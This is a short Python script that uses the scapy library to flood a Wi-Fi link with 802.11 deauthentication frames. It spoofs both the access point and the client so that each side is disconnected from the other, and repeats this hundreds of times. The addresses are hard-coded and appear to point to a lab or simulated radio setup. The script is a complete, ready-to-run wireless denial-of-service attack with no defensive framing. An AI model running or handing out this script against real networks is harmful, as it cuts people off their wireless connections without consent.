#!/usr/bin/env python3
import sys, time
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

AP = "02:00:00:00:00:00"
CLIENT = "02:00:00:00:01:00"
IFACE = "wlan2"
count = int(sys.argv[1]) if len(sys.argv) > 1 else 300

pkt = RadioTap() / Dot11(addr1=CLIENT, addr2=AP, addr3=AP) / Dot11Deauth(reason=7)
pkt2 = RadioTap() / Dot11(addr1=AP, addr2=CLIENT, addr3=AP) / Dot11Deauth(reason=7)
t0 = time.time()
for i in range(count):
    sendp(pkt, iface=IFACE, verbose=False)
    sendp(pkt2, iface=IFACE, verbose=False)
    time.sleep(0.02)
print(f"Sent {count*2} deauth frames in {time.time()-t0:.1f}s")
